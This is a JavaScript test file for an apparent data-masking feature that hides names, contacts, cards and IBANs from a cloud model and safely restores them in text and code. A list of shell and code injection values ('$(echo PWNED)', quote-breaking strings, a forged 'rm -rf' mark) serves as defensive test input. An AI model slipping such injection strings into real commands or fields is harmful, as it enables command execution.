// Masked requests (D681): what the organisation hides reaches a brain in the cloud as placeholders, and comes back real.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync } from 'node:child_process'
import { fire } from '../app/core/hooks.js'
import { LLMError } from '../app/core/llm.js'
import { runTurn } from '../app/core/loop.js'
import { checked, dlpHooks, PLACES } from '../app/ee/detect.js'
import { inCode, mapped, maskHooks, revealInCode } from '../app/ee/mask.js'

const CARD = '4111 1111 1111 1111'
const IBAN = 'FR14 2004 1010 0505 0001 3M02 606'
const BRAIN = { id: 'cloud', model: 'm' }
const MARK = /⟦[A-Z][0-9a-f]{6,}⟧/g

/** Hooks over a conversation of its own, and what they kept and said. @param {any} mask @param {any} [more] @param {any} [say] */
function room(mask = { words: ['Projet Hermès', 'Marie Dupont', "L'Oréal"], hide: ['email', 'phone'] }, more = { detect: ['card', 'iban'] }, say = {}) {
  const kept = /** @type {any[]} */ ([])
  const records = /** @type {any[]} */ ([])
  const told = /** @type {string[]} */ ([])
  const hooks = maskHooks({ ...more, mask }, {
    isLocal: (brain) => brain.api === 'device',
    load: async () => ({ id: '01JTASKULID', records }),
    keep: async (_, meta) => { kept.push(meta); records.push({ meta }) },
    assistant: () => 'Jean',
    open: () => false,
    held: () => told.push('held'),
    heldReason: () => 'A picture was here.',
    why: (values) => `Would send ${values.join()}`,
    mayGo: () => 'May go',
    reason: () => 'Refused',
    // eslint-disable-next-line require-yield
    async* refused(why) { told.push(why); throw new Error(`Refused: ${why}`) },
    ...say,
  })
  return { hooks, kept, records, told }
}

/** A step through the hooks: what went on the wire, and what came back. @param {any} hooks @param {any} e @param {(wire: any) => any[]} [answer] */
async function step(hooks, e, answer = () => [{ type: 'done', stopReason: 'end', message: { role: 'assistant', content: '' } }]) {
  const wires = /** @type {any[]} */ ([])
  const events = []
  for await (const event of await fire(hooks, 'turn.step', { task: 't', brain: BRAIN, system: '', messages: [], ...e }, async function* (wire) {
    wires.push(wire)
    yield* answer(wire)
  })) events.push(event)
  return { wire: wires[0], wires, events, text: events.flatMap((event) => (event.type === 'text' ? [event.delta] : [])).join('') }
}
const user = (/** @type {string} */ content, /** @type {any} */ more = {}) => ({ role: 'user', content, ...more })
const seen = (/** @type {any} */ wire) => JSON.stringify(wire, (key, value) => (key === 'signal' || key === 'brain' ? undefined : value))
const check = (/** @type {any} */ hooks, /** @type {any} */ e, /** @type {any} */ said = { decision: 'allow' }) => fire(hooks, 'tool.check', { task: 't', ...e }, () => said)

test('what is hidden doesn’t go, wherever it is, and placeholders are all that remain of it', async () => {
  const { hooks } = room()
  const secret = ['Projet Hermès', 'Marie Dupont', 'marie@acme.fr', '+33 6 12 34 56 78', CARD, IBAN]
  const text = `Pour ${secret.join(', ')}.`
  const { wire } = await step(hooks, {
    system: `Memory: ${text}`,
    messages: [
      user(text, { documents: [{ name: 'Marie Dupont.pdf', text, source: 1 }] }),
      { role: 'assistant', content: text, toolCalls: [{ id: '1', name: 'send', args: { to: 'marie@acme.fr', 'Marie Dupont': 1, deep: { rows: [[CARD]] }, card: 4111111111111111 } }] },
      { role: 'tool', toolCallId: '1', name: 'send', content: text },
      { role: 'system', content: text },
    ],
    tools: [{ name: 'send', description: `Sends for ${text}`, parameters: { type: 'object', properties: { x: { description: text, enum: ['Marie Dupont'] } } } }],
  })
  const all = seen(wire)
  for (const value of [...secret, '4111111111111111']) assert.ok(!all.includes(value), value)
  assert.ok(all.match(MARK).length > 10)
  assert.equal(wire.messages[0].documents[0].source, 1)
  assert.equal(wire.tools[0].name, 'send')
  assert.ok(wire.system.endsWith('never guess at them or ask what they are.'))
})

test('what comes back is real, in the text, in what it thought, in calls and in the message history keeps', async () => {
  const { hooks } = room()
  /** @type {any} */
  let mark
  const { events, text, wire } = await step(hooks, { messages: [user('Pour Marie Dupont.')] }, (going) => {
    mark = going.messages[0].content.match(MARK)[0]
    return [
      { type: 'thinking', delta: `About ${mark}` },
      { type: 'text', delta: `Bonjour ${mark}.` },
      { type: 'tool_call', call: { id: '1', name: 'send', args: { to: mark, list: [{ who: mark }] } } },
      { type: 'done', stopReason: 'tool_use', message: { role: 'assistant', content: `Bonjour ${mark}.`, toolCalls: [{ id: '1', name: 'send', args: { to: mark } }], raw: [{ type: 'thinking', thinking: `About ${mark}`, signature: 's' }], rawModel: 'm' } },
    ]
  })
  assert.ok(!seen(wire).includes('Marie'))
  assert.equal(text, 'Bonjour Marie Dupont.')
  assert.equal(events.find((event) => event.type === 'thinking').delta, 'About Marie Dupont')
  assert.deepEqual(events.find((event) => event.type === 'tool_call').call.args, { to: 'Marie Dupont', list: [{ who: 'Marie Dupont' }] })
  const done = events.find((event) => event.type === 'done')
  assert.equal(done.message.content, 'Bonjour Marie Dupont.')
  assert.equal(done.message.toolCalls[0].args.to, 'Marie Dupont')
  // Only the brain's own raw stays as it wrote it: it must come back unchanged.
  assert.equal(done.message.raw[0].thinking, `About ${mark}`)
})

test('a placeholder split across deltas comes back whole, at every cut', async () => {
  const { hooks } = room()
  /** @type {any} */
  const first = await step(hooks, { messages: [user('Marie Dupont')] })
  const mark = first.wire.messages[0].content
  const said = `Oui ${mark}, et ${mark} encore ⟦ pas fini`
  for (let cut = 1; cut < said.length; cut++) {
    const { text } = await step(hooks, { messages: [user('Marie Dupont')] }, () => [{ type: 'text', delta: said.slice(0, cut) }, { type: 'text', delta: said.slice(cut) }, { type: 'done', stopReason: 'end', message: { role: 'assistant', content: '' } }])
    assert.equal(text, 'Oui Marie Dupont, et Marie Dupont encore ⟦ pas fini', `cut at ${cut}`)
  }
  // And when a stream ends with no end of its own.
  const { text } = await step(hooks, { messages: [] }, () => [{ type: 'text', delta: 'Fin ⟦Pabc' }])
  assert.equal(text, 'Fin ⟦Pabc')
})

test('a mark whose brackets a brain dropped or changed is known all the same, and cut in two; any other word stays', async () => {
  const { hooks } = room()
  const { wire } = await step(hooks, { messages: [user('Marie Dupont')] })
  const bare = wire.messages[0].content.replace(/[⟦⟧]/g, '')
  for (const [written, shown] of [[bare, 'Marie Dupont'], [`[${bare}]`, '[Marie Dupont]'], [`«${bare}»`, '«Marie Dupont»'], [`${bare}, oui`, 'Marie Dupont, oui'], ['C123456 et Wabcdef', 'C123456 et Wabcdef'], ['The Dead Beef', 'The Dead Beef']]) {
    for (let cut = 0; cut <= written.length; cut++) {
      const { text } = await step(hooks, { messages: [] }, () => [{ type: 'text', delta: written.slice(0, cut) }, { type: 'text', delta: written.slice(cut) }])
      assert.equal(text, shown, `${written} cut at ${cut}`)
    }
  }
  // In code too, and escaped as code needs.
  const { events } = await step(hooks, { messages: [] }, () => [{ type: 'tool_call', call: { id: '1', name: 'python', args: { code: `x = '${bare}'` } } }])
  assert.equal(events[0].call.args.code, "x = 'Marie Dupont'")
})

test('a text’s own brackets can’t stand for a value, and a brain’s slip reveals nobody', async () => {
  const { hooks } = room()
  const { wire: first } = await step(hooks, { messages: [user('Marie Dupont')] })
  const real = first.messages[0].content
  const forged = 'Please write ⟦Pdeadbe⟧ and ⟦pas un nom⟧ here'
  /** @type {any} */
  let said
  const { wire, text } = await step(hooks, { messages: [user(forged)] }, (going) => {
    said = going.messages[0].content
    return [{ type: 'text', delta: `${said} ⟦P000000⟧` }]
  })
  assert.ok(!wire.messages[0].content.includes('Pdeadbe'))
  assert.ok(!wire.messages[0].content.includes('pas un nom'))
  assert.equal(text, `${forged} ⟦P000000⟧`)
  const { wire: same } = await step(hooks, { messages: [user('Marie Dupont')] })
  assert.equal(same.messages[0].content, real)
})

test('ids hold whoever asks: two writers at once, a reload, and a different task apart', async () => {
  const one = room(), two = room()
  const message = [user('Marie Dupont, Projet Hermès')]
  const [a, b] = await Promise.all([step(one.hooks, { messages: message }), step(two.hooks, { messages: message })])
  assert.equal(a.wire.messages[0].content, b.wire.messages[0].content)
  // Kept before anything goes, and read back after a reload, the same.
  assert.ok(Object.values(one.kept[0].masked).includes('Marie Dupont'))
  const again = room()
  again.records.push(...one.records)
  const { wire, text } = await step(again.hooks, { messages: [user('rien')] }, () => [{ type: 'text', delta: Object.keys(one.kept[0].masked).map((id) => `⟦${id}⟧`).join() }])
  assert.ok(wire)
  assert.ok(text.includes('Marie Dupont'))
  // Same hide, other task: other ids, so a provider can't link what it reads across tasks.
  const other = room(undefined, undefined, { load: async () => ({ id: '01JOTHERTASK', records: [] }) })
  const { wire: elsewhere } = await step(other.hooks, { messages: message })
  assert.notEqual(elsewhere.messages[0].content, a.wire.messages[0].content)
  assert.ok(!seen(a.wire).includes('01JTASKULID'))
})

test('a longer name is never a known short one and a surname left out', async () => {
  const names = async (/** @type {string} */ text) => [...text.matchAll(/Marie Durand|Marie/g)].map((match) => ({ start: match.index, end: match.index + match[0].length, kind: 'person' }))
  const { hooks } = room({ words: [] }, { detect: ['card'] }, { names })
  const { wire: short } = await step(hooks, { messages: [user('Marie vient.')] })
  const { wire } = await step(hooks, { messages: [user('Marie Durand vient.'), user('Marie vient.')] })
  assert.ok(!seen(wire).includes('Durand'))
  assert.ok(!wire.messages[0].content.startsWith(short.messages[0].content.split(' ')[0]))
  assert.equal(wire.messages[1].content, short.messages[0].content)
})

test('what must stay stays, the assistant’s name first, or it would rewrite the prompt; but what policy hides comes before that name', async () => {
  const names = async (/** @type {string} */ text) => [...text.matchAll(/Jean/g)].map((match) => ({ start: match.index, end: match.index + 4, kind: 'person' }))
  const { hooks } = room({ words: ['Warehouse', 'ACME'], keep: ['Warehouse'] }, {}, { names })
  const { wire } = await step(hooks, { system: 'You are Jean, for Warehouse.', messages: [user('Jean and ACME and Warehouse')] })
  assert.ok(wire.system.startsWith('You are Jean, for Warehouse.'))
  assert.match(wire.messages[0].content, /^Jean and ⟦W[0-9a-f]+⟧ and Warehouse$/)
  const named = room({ words: ['Atlas'] }, {}, { assistant: () => 'Atlas' })
  const { wire: hidden } = await step(named.hooks, { messages: [user('Pour Atlas')] })
  assert.ok(!hidden.messages[0].content.includes('Atlas'))
})

test('values cut before the hook don’t go in part', async () => {
  const { hooks } = room()
  await step(hooks, { messages: [user('Marie Dupont')] })
  for (const [text, gone] of [['Écrit par Marie Dup', 'Marie Dup'], ['upont a écrit', 'upont'], [`Carte ${CARD.slice(0, 14)}`, CARD.slice(0, 14)], [`IBAN ${IBAN.slice(0, 19)}`, IBAN.slice(0, 19)], [`${CARD.slice(-14)} fin`, CARD.slice(-14)]]) {
    const { wire } = await step(hooks, { messages: [user(text)] })
    assert.ok(!wire.messages[0].content.includes(gone), wire.messages[0].content)
  }
  // Where they really are cut: before a closing tag, a note, an ellipsis, or after an opening one.
  for (const text of ['Marie Dup\n</about>', '<thinking>\nupont', 'Marie Dup…', 'Marie Dup\n\n(file.pdf)', `${CARD.slice(0, 14)}\n</about>`]) {
    const { wire } = await step(hooks, { messages: [user(text)] })
    for (const gone of ['Marie', 'Dup', 'upont', '4111']) assert.ok(!wire.messages[0].content.includes(gone), wire.messages[0].content)
  }
  // A part stays where it stood: it isn't looked for anywhere else.
  const { wire: elsewhere } = await step(hooks, { messages: [user('Une dup de Marie Dup\n</about>'), user('Ceci est Marie Dup au milieu')] })
  assert.match(elsewhere.messages[0].content, /^Une dup de ⟦C/)
  assert.ok(elsewhere.messages[1].content.includes('Marie Dup au milieu'))
  // But an ordinary text keeps its numbers: what a brain works things out from.
  const { wire } = await step(hooks, { messages: [user('Le total est de 184 000 €, soit 12 % de plus, le 3 mars 2026.')] })
  assert.equal(wire.messages[0].content, 'Le total est de 184 000 €, soit 12 % de plus, le 3 mars 2026.')
})

const AWKWARD = ["L'Oréal", 'O\'Brien & "Sons"', '"Le Monde"', 'Prix $5 `x`', 'C:\\Users\\Marie', 'Marie\nDupont']

test('a value lands in code as what it is, in each tool and wherever it stands', () => {
  const run = (/** @type {string} */ code, /** @type {'shell' | 'js' | 'py'} */ lang, /** @type {string} */ value) => revealInCode(code, lang, () => value)
  for (const value of AWKWARD) {
    assert.equal(JSON.parse(run('⟦Pabcdef⟧', 'js', value)), value)
    for (const quote of ["'", '"', '`']) {
      const code = run(`x = ${quote}A ⟦Pabcdef⟧ B${quote}`, 'js', value)
      // eslint-disable-next-line no-new-func
      assert.equal(new Function(`let x; ${code}; return x`)(), `A ${value} B`, code)
    }
    assert.equal(JSON.parse(run('"⟦Pabcdef⟧"', 'py', value)), value)
    assert.equal(run("# it's ⟦Pabcdef⟧\n", 'py', value), `# it's ${value.replace(/\s*\n\s*/g, ' ')}\n`)
  }
  assert.equal(run("echo 'A ⟦Pabcdef⟧'", 'shell', "L'Oréal"), "echo 'A L'\\''Oréal'")
  assert.equal(run('echo "A ⟦Pabcdef⟧"', 'shell', 'Prix $5 `x`'), 'echo "A Prix \\$5 \\`x\\`"')
  assert.equal(run('echo ⟦Pabcdef⟧', 'shell', "L'Oréal"), "echo 'L'\\''Oréal'")
  assert.equal(run("cat <<'EOF'\nit's ⟦Pabcdef⟧\nEOF\necho ⟦Pabcdef⟧", 'shell', "L'Oréal"), "cat <<'EOF'\nit's L'Oréal\nEOF\necho 'L'\\''Oréal'")
  assert.equal(run('cat <<EOF\nA ⟦Pabcdef⟧\nEOF', 'shell', '$5'), 'cat <<EOF\nA \\$5\nEOF')
  assert.equal(run('"""A ⟦Pabcdef⟧"""', 'py', 'x"y'), '"""A x\\"y"""')
  // A quote in a comment doesn't open a string.
  assert.equal(run("// don't\nx = '⟦Pabcdef⟧'", 'js', "L'Oréal"), "// don't\nx = 'L\\'Oréal'")
  assert.equal(run("x = '⟦Pabcdef⟧' /* it's */ + '⟦Pabcdef⟧'", 'js', 'a'), "x = 'a' /* it's */ + 'a'")
  assert.equal(run('⟦nope⟧', 'js', 'a'), '⟦nope⟧')
  // Bare, on a heredoc's line too.
  assert.equal(revealInCode('cat <<EOF\nFor Pabcdef\nEOF', 'shell', (_, kind, id) => (id === 'abcdef' ? 'Marie' : undefined)), 'cat <<EOF\nFor Marie\nEOF')
})

/** What code really does. @param {string} command @param {string[]} args */
function ran(command, args) {
  try { return execFileSync(command, args, { encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }) } catch (error) { return `FAILED ${/** @type {any} */ (error).code ?? ''}` }
}
const HOSTILE = ["a'; echo PWNED; echo 'b", 'a"; echo PWNED; echo "b', 'a`echo PWNED`b', 'a$(echo PWNED)b', 'a\necho PWNED\nb', 'a\\', "'", '"', '*/ console.log("PWNED") /*', '{x}', '${process.exit}', '\r\nprint("PWNED")']
const hasPython = ran('python3', ['-c', 'print(1)']).startsWith('1')

test('a value that means harm stays a value in real shells and languages, or the call is refused', () => {
  const quiet = (/** @type {string} */ code, /** @type {'shell' | 'js' | 'py'} */ lang, /** @type {string} */ value) => { try { return revealInCode(code, lang, () => value) } catch { return null } }
  for (const value of HOSTILE) {
    for (const template of ["printf %s '⟦Pabcdef⟧'", 'printf %s "⟦Pabcdef⟧"', 'printf %s ⟦Pabcdef⟧', 'printf %s "$(printf %s \'⟦Pabcdef⟧\')"']) {
      const code = /** @type {string} */ (quiet(template, 'shell', value))
      assert.equal(ran('bash', ['-c', code]), value, code)
    }
    // Text run as code, arithmetic and backquotes: refused, as nothing here can tell what they'd do.
    for (const template of ["bash -c 'echo \"⟦Pabcdef⟧\"'", 'eval "echo ⟦Pabcdef⟧"', 'echo $((1 << ⟦Pabcdef⟧))', 'echo `echo ⟦Pabcdef⟧`']) assert.equal(quiet(template, 'shell', value), null, template)
    const here = quiet('cat <<EOF\n⟦Pabcdef⟧\nEOF\necho end', 'shell', value)
    if (/\r|\n/.test(value)) assert.equal(here, null)
    else assert.equal(ran('bash', ['-c', /** @type {string} */ (here)]), `${value}\nend\n`, here ?? '')
    if (hasPython) {
      for (const template of ["x = '⟦Pabcdef⟧'\nprint(x, end='')", 'x = "⟦Pabcdef⟧"\nprint(x, end="")', 'x = """⟦Pabcdef⟧"""\nprint(x, end="")', 'x = ⟦Pabcdef⟧\nprint(x, end="")', "x = f'⟦Pabcdef⟧'\nprint(x, end='')"]) {
        const code = /** @type {string} */ (quiet(template, 'py', value))
        assert.equal(ran('python3', ['-c', code]), value, code)
      }
      assert.equal(ran('python3', ['-c', /** @type {string} */ (quiet('# ⟦Pabcdef⟧\nprint("ok", end="")', 'py', value))]), 'ok')
    }
    for (const template of ["const x = '⟦Pabcdef⟧'; process.stdout.write(x)", 'const x = "⟦Pabcdef⟧"; process.stdout.write(x)', 'const x = `⟦Pabcdef⟧`; process.stdout.write(x)', 'const x = ⟦Pabcdef⟧; process.stdout.write(x)']) {
      const code = /** @type {string} */ (quiet(template, 'js', value))
      assert.equal(ran('node', ['-e', code]), value, code)
    }
    for (const template of ["/* ⟦Pabcdef⟧ */ process.stdout.write('ok')", "// ⟦Pabcdef⟧\nprocess.stdout.write('ok')"]) assert.equal(ran('node', ['-e', /** @type {string} */ (quiet(template, 'js', value))]), 'ok', template)
    // A regular expression can't hold a value safely.
    assert.equal(quiet("const r = /'/; const x = /⟦Pabcdef⟧/", 'js', value), null)
  }
  // What is plain goes through what runs text as code; what isn't doesn't.
  assert.equal(quiet("bash -c 'echo ⟦Pabcdef⟧'", 'shell', 'Marie Dupont'), "bash -c 'echo Marie Dupont'")
  assert.equal(quiet("bash -c 'echo ⟦Pabcdef⟧'", 'shell', "L'Oréal"), null)
  assert.equal(quiet('eval(`⟦Pabcdef⟧`)', 'js', 'a;b'), null)
  assert.equal(quiet('os.system("⟦Pabcdef⟧")', 'py', 'a;b'), null)
})

test('a call whose mark can’t be made real is refused, saying why, and what a source forged stays a mark', async () => {
  const { hooks } = room({ words: ["O'Brien"] }, {})
  const { wire } = await step(hooks, { messages: [user("O'Brien ⟦rm -rf⟧")] })
  const [mark, forged] = wire.messages[0].content.match(MARK)
  const { events } = await step(hooks, { messages: [] }, () => [
    { type: 'tool_call', call: { id: '1', name: 'bash', args: { command: `bash -c 'echo ${mark}'` } } },
    { type: 'tool_call', call: { id: '2', name: 'bash', args: { command: `echo ${forged}` } } },
    { type: 'tool_call', call: { id: '3', name: 'write', args: { content: `${mark} ${forged}` } } },
  ])
  const refused = await check(hooks, { name: 'bash', kind: 'execute', args: events[0].call.args })
  assert.equal(refused.decision, 'never')
  assert.match(refused.reason, /could run as code/)
  assert.ok(!JSON.stringify(events[0].call.args).includes("O'Brien"))
  assert.equal(events[1].call.args.command, `echo ${forged}`)
  assert.equal(events[2].call.args.content, "O'Brien ⟦rm -rf⟧")
})

test('a value escaped into code, or encoded in an address, doesn’t go when a call is read again', async () => {
  for (const value of AWKWARD) {
    const { hooks } = room({ words: [value] }, {})
    const { wire } = await step(hooks, { messages: [user(value)] })
    const mark = wire.messages[0].content
    assert.match(mark, /^⟦W[0-9a-f]+⟧$/, value)
    const forms = [...['"', "'", '`'].map((quote) => inCode(value, quote, 'js')), ...["'", '"', null].map((state) => inCode(value, state, 'shell')), encodeURIComponent(value), JSON.stringify(value).slice(1, -1)]
    const { wire: replay } = await step(hooks, { messages: [{ role: 'assistant', content: '', toolCalls: forms.map((form, n) => ({ id: String(n), name: 'bash', args: { command: `echo ${form} x` } })) }] })
    for (const call of replay.messages[0].toolCalls) assert.ok(call.args.command.includes(mark), `${value}: ${call.args.command}`)
  }
  // Python's json.dumps, with what follows it.
  const { hooks } = room({ words: ['Hermès'] }, {})
  const { wire } = await step(hooks, { messages: [user('{"a": "Herm\\u00e8s"} https://x.example/?q=Herm%C3%A8s&r=1')] })
  assert.ok(!seen(wire).toLowerCase().includes('herm'))
})

test('a value is the value it is, however it is spelled', async () => {
  const hidden = { 'Marie Dupont': ['Marie\u00a0Dupont', 'Marie\nDupont', 'Marie  Dupont', 'Marie-Dupont', 'Mar\u00adie Dupont', 'MARIE DUPONT', 'marie_dupont', 'Marie\u2009Dupont', 'Marie%20Dupont', 'Marie&nbsp;Dupont'],
    "L'Oréal": ['L’Oréal', 'L&#39;Oréal', 'L&apos;Oréal', 'L\\u0027Oréal', "L'Ore\u0301al", "L'OREAL", 'L%27Or%C3%A9al'],
    Hermès: ['Herm&egrave;s', 'Herm&#232;s', 'Herm&#xe8;s', 'Herm\\xe8s', 'Herm%E8s', 'Herm%C3%A8s', 'Herm\\u00e8s', 'HERMES', 'Herme\u0300s'],
    Weiß: ['WEISS', 'weiss'], Yıldız: ['YILDIZ', 'yildiz'], 'İstanbul Bank': ['İSTANBUL BANK', 'istanbul bank', 'İstanbul Bank'],
    'أحمد': ['احمد', 'أَحْمَد', 'أحـــمد', 'وأحمد'], '田中商事': ['田中商事は', '田中商事'], 'ⅣA': ['IVA'] }
  for (const [word, spellings] of Object.entries(hidden)) {
    const { hooks } = room({ words: [word] }, {})
    const { wire: first } = await step(hooks, { messages: [user(word)] })
    assert.match(first.messages[0].content, /^⟦W[0-9a-f]+⟧$/, word)
    for (const spelling of spellings) {
      const { wire } = await step(hooks, { messages: [user(`Pour ${spelling}.`)] })
      assert.ok(wire.messages[0].content.includes(first.messages[0].content), `${word} as ${spelling}: ${wire.messages[0].content}`)
    }
  }
})

test('a word within another isn’t the word, and ordinary text goes as it is', async () => {
  const { hooks } = room({ words: ['Ana', 'Banque Populaire', 'Array Networks', 'Hermès'], hide: ['email', 'phone'] }, { detect: ['card', 'iban', 'nir', 'ssn', 'secret'] })
  await step(hooks, { messages: [user('Ana, Banque Populaire, Array Networks, Hermès')] })
  const ordinary = ['Analyse des banques', 'Total 120+35+2500', '5000+1200+3400+7000', 'We ship the XP25 to all our French customers', 'Facture du 01.02.2026', '12 345 678 euros', 'Le 03.11.2026 14:30', '+1 250 000 EUR', 'lit@3.1.0', 'FR0012345678', 'a0123456789f', 'Commande 2026-1042, soit 1 234,56 €', 'Sold 1,250 units at 3.50 each on 12/03/2026.', 'See https://example.com/a/b?x=1&y=2', 'تم الدفع في ٢٠٢٦/١١/٠١', 'ordre n° 45871236', 'Version 18.3.1 of the tool']
  for (const text of ordinary) {
    const { wire } = await step(hooks, { messages: [user(text)] })
    assert.equal(wire.messages[0].content, text)
  }
  // A schema's shape stays, whatever is hidden.
  const shaped = room({ words: ['string', 'object'] }, {})
  const { wire } = await step(shaped.hooks, { messages: [], tools: [{ name: 'x', description: 'Takes a string', parameters: { type: 'object', properties: { a: { type: 'string', format: 'date' } } } }] })
  assert.deepEqual(wire.tools[0].parameters, { type: 'object', properties: { a: { type: 'string', format: 'date' } } })
  assert.match(wire.tools[0].description, /^Takes a ⟦W/)
})

test('phones and numbers in any script and with any separator are found', async () => {
  const { hooks } = room({ hide: ['phone', 'email'] }, { detect: ['card'] })
  for (const value of ['٠٥٠١٢٣٤٥٦٧', '212.555.1234', '06/12/34/56/78', '06 12 34 56 78', '+33 6 12 34 56 78', '(415) 555-0100', '03-1234-5678', '４１１１ １１１１ １１１１ １１１１', '٤١١١ ١١١١ ١١١١ ١١١١', 'marie.dupont@acme.example', 'marie@acme.fr']) {
    const { wire } = await step(hooks, { messages: [user(`Voici ${value}.`)] })
    assert.match(wire.messages[0].content, /^Voici ⟦[A-Z][0-9a-f]+⟧\.$/, value)
  }
})

test('the last sweep refuses what masking can’t change, and nothing of it is told', async () => {
  // A tool's name can't be masked: a word in it stops the request.
  const { hooks, told } = room({ words: ['Hermès'] }, {})
  await assert.rejects(step(hooks, { messages: [user('Bonjour')], tools: [{ name: 'hermes_search', description: 'Searches', parameters: {} }] }), /Refused/)
  assert.match(told[0], /still there: a tool's name/)
  assert.ok(!told.join().toLowerCase().includes('herm'))
  await assert.rejects(step(hooks, { messages: [{ role: 'assistant', content: '', toolCalls: [{ id: '1', name: 'hermes_search', args: {} }] }] }), /Refused/)
  // Something that isn't text never goes unread.
  await assert.rejects(step(hooks, { messages: [{ role: 'user', content: ['Hermès'] }] }), /Refused/)
})

test('it fails closed: nothing goes when finding or keeping fails', async () => {
  const wires = async (/** @type {any} */ say) => {
    const { hooks, told } = room(undefined, undefined, say)
    let went = 0
    await assert.rejects(async () => { for await (const _ of await fire(hooks, 'turn.step', { task: 't', brain: BRAIN, messages: [user('Marie Dupont')] }, async function* () { went++; yield { type: 'text', delta: 'x' } })); }, /Refused/)
    assert.equal(went, 0)
    return told
  }
  await wires({ names: async () => { throw new Error('no model') } })
  await wires({ keep: async () => { throw new Error('disk') } })
  await wires({ load: async () => { throw new Error('unreadable') } })
  // A brain on this device, or one the organisation allows, reads it as it is.
  const { hooks } = room(undefined, { detect: ['card'], brains: ['vault'] })
  for (const brain of [{ id: 'device', api: 'device' }, { id: 'vault', model: 'm' }]) {
    const { wire } = await step(hooks, { brain, messages: [user('Marie Dupont')] })
    assert.equal(wire.messages[0].content, 'Marie Dupont')
  }
})

test('requests at once, a title’s and the step’s, keep each new mark once', async () => {
  const { hooks, kept } = room()
  await Promise.all([step(hooks, { messages: [user('Marie Dupont')] }), step(hooks, { messages: [user('Marie Dupont')] })])
  assert.deepEqual(kept.flatMap((note) => Object.values(note.masked)), ['Marie Dupont'])
})

test('a mark whose note failed to be kept is kept at the next try, or nothing goes', async () => {
  let failing = true
  const kept = /** @type {any[]} */ ([])
  const { hooks } = room(undefined, undefined, { keep: async (/** @type {string} */ _, /** @type {any} */ meta) => { if (failing) throw new Error('disk'); kept.push(meta) } })
  await assert.rejects(step(hooks, { messages: [user('Marie Dupont')] }), /Refused/)
  failing = false
  await step(hooks, { messages: [user('Marie Dupont')] })
  assert.ok(Object.values(kept[0].masked).includes('Marie Dupont'))
})

test('the audit hears how many of each kind, for its task, and never what', async () => {
  const told = /** @type {any[]} */ ([])
  const { hooks } = room(undefined, undefined, { told: (/** @type {string[]} */ letters, /** @type {string} */ task) => told.push({ letters, task }) })
  await step(hooks, { messages: [user('Marie Dupont, marie@acme.fr')] })
  // Only what's new is told.
  await step(hooks, { messages: [user('Marie Dupont, marie@acme.fr')] })
  assert.equal(told.length, 1)
  assert.deepEqual(told[0].letters.sort(), ['E', 'W'])
  assert.equal(told[0].task, 't')
  assert.ok(!JSON.stringify(told).includes('Marie'))
})

test('a label still refuses: hiding names doesn’t make a marked document readable', async () => {
  const dlp = { detect: ['card'], labels: ['Confidentiel'], brains: ['vault'], mask: { words: ['ACME'] } }
  const hooks = dlpHooks(dlp, { isLocal: () => false, reason: () => '', why: () => '', async* refused() { throw new Error('Refused') } })
  const pass = await fire(hooks, 'turn.step', { brain: BRAIN, messages: [user(`ACME ${CARD}`)] }, () => 'sent')
  assert.equal(pass, 'sent')
  const refused = await fire(hooks, 'turn.step', { brain: BRAIN, messages: [user('Document confidentiel')] }, () => 'sent')
  await assert.rejects(async () => { for await (const _ of refused); }, /Refused/)
})

test('a brain’s raw goes back only as it wrote it to this mask; from the first that didn’t, none does', async () => {
  const { hooks } = room()
  const raw = [{ type: 'thinking', thinking: 'About a mark', signature: 'sig' }]
  await step(hooks, { messages: [user('Bonjour')] }, () => [{ type: 'done', stopReason: 'end', message: { role: 'assistant', content: 'ok', raw } }])
  const before = [{ type: 'thinking', thinking: 'From before masking, about Marie Dupont', signature: 'sig2' }]
  const assistant = (/** @type {any} */ blocks, /** @type {any} */ more = {}) => ({ role: 'assistant', content: 'ok', raw: blocks, rawModel: 'm', ...more })
  const kept = (/** @type {any} */ wire) => wire.messages.map((/** @type {any} */ message) => Boolean(message.raw))
  // Its own: goes, unchanged, and as it read back from a file.
  const own = await step(hooks, { messages: [user('a'), assistant(JSON.parse(JSON.stringify(raw))), user('b')] })
  assert.deepEqual(own.wire.messages[1].raw, raw)
  // An earlier one, then its own after it: neither.
  const earlier = await step(hooks, { messages: [user('a'), assistant(before), user('b'), assistant(raw), user('c')] })
  assert.deepEqual(kept(earlier.wire), [false, false, false, false, false])
  assert.ok(!seen(earlier.wire).includes('Marie'))
  // Its own, then an earlier one: only what comes before the first bad one.
  const mixed = await step(hooks, { messages: [user('a'), assistant(raw), user('b'), assistant(before), user('c')] })
  assert.deepEqual(kept(mixed.wire), [false, true, false, false, false])
  // Another model's never goes anyway, and costs nothing.
  const other = await step(hooks, { messages: [assistant(before, { rawModel: 'other' }), user('b'), assistant(raw), user('c')] })
  assert.deepEqual(kept(other.wire), [false, false, true, false])
  // A brain paused in its own search can't go on from part of it.
  await assert.rejects(step(hooks, { messages: [user('a'), assistant(before)] }), /Refused/)
})

test('a word hidden since stops a brain’s raw that holds it going back', async () => {
  let more = /** @type {string[]} */ ([])
  const { hooks } = room({ words: ['Marie Dupont'] }, {}, { more: () => more })
  const raw = [{ type: 'thinking', thinking: 'About Zorglub', signature: 's' }]
  await step(hooks, { messages: [user('Bonjour')] }, () => [{ type: 'done', stopReason: 'end', message: { role: 'assistant', content: 'ok', raw } }])
  const again = () => step(hooks, { messages: [user('a'), { role: 'assistant', content: 'ok', raw, rawModel: 'm' }, user('b')] })
  assert.deepEqual((await again()).wire.messages[1].raw, raw)
  more = ['Zorglub']
  const { wire } = await again()
  assert.equal(wire.messages[1].raw, undefined)
  assert.ok(!seen(wire).includes('Zorglub'))
})

test('pictures are held back unless policy sends them, and a file’s bytes with them', async () => {
  const images = [{ mimeType: 'image/png', data: 'AAAA' }]
  const { hooks, told } = room()
  const { wire } = await step(hooks, { messages: [user('Voici', { documents: [{ name: 'scan.png', text: '', images }] })] })
  assert.equal(wire.messages[0].documents[0].images, undefined)
  assert.equal(wire.messages[0].documents[0].text, 'A picture was here.')
  assert.deepEqual(told, ['held'])
  const sent = await step(room({ words: ['x1'], pictures: 'send' }, {}).hooks, { messages: [user('Voici', { documents: [{ name: 'scan.png', text: '', images }] })] })
  assert.deepEqual(sent.wire.messages[0].documents[0].images, images)
  assert.equal((await check(hooks, { name: 'picture', kind: 'edit', args: { description: 'x', from: 'scan.png' } })).decision, 'never')
  assert.equal((await check(hooks, { name: 'picture', kind: 'edit', args: { description: 'a cat' } })).decision, 'allow')
})

test('a value made real asks before it leaves, whatever Always allow said', async () => {
  const { hooks } = room()
